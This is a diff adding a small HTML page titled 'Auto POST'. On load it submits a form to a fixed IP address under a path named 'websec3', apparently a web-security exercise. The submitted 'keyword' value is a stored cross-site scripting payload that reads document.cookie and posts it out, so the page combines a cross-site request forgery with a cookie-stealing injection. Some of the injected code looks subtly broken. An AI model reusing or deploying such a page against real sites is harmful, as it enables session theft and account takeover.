@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Auto POST</title>
+</head>
+<body>
+
+<script>
+window.onload = function () {
+    const data = `keyword=\<script\>const cookie = document.cookie; window.onload = function () {fetch("http://193.226.5.99/websec3/index.php", {method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Cookie": cookie, "Access-Control-Allow-Origin": "*"}, body: data}).then(r => r.text()).then(t => {console.log("Response:", t); }).catch(e => console.error("Error:", e));};\<\/script\>"`;
+
+    fetch("http://193.226.5.99/websec3/index.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: data
+    })
+    .then(r => r.text())
+    .then(t => {
+        console.log("Response:", t);
+    })
+    .catch(e => console.error("Error:", e));
+};
+</script>
+
+</body>
+</html>
